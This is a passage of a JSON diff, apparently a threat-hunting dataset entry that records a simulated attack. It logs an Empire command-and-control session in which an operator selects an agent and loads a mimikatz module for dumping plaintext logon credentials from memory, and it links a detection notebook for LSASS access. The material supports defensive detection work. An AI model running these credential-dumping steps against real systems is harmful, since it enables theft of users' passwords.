+        "adversary_commands": "(Empire: agents) > agents\n[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http\nB7Y8G4XC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1648   5/0.0    2020-08-07 14:31:46  http\n(Empire: agents) > interact B7Y8G4XC\n(Empire: B7Y8G4XC) >\n(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/logonpasswords*\n(Empire: powershell/credentials/mimikatz/logonpasswords) > info\nName: Invoke-Mimikatz DumpCreds\nModule: powershell/credentials/mimikatz/logonpasswords\nNeedsAdmin: True\nOpsecSafe: True\nLanguage: powershell\nMinLanguageVersion: 2\nBackground: True\nOutputExtension: None\nAuthors:\n@JosephBialek\n@gentilkiwi\nDescription:\nRuns PowerSploit's Invoke-Mimikatz function to extract\nplaintext credentials from memory.\nComments:\nhttp://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\nOptions:\nName  Req",
+        "tools": [
+          "Empire (credentials)"
+        ],
+        "notebooks": [
+          "LSASS Access from Non System Account (https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html)"
+        ],
+        "source_file": "SDWIN-190518202151.yaml",
+        "content_hash": ""
+      }
+    }
   }
 }
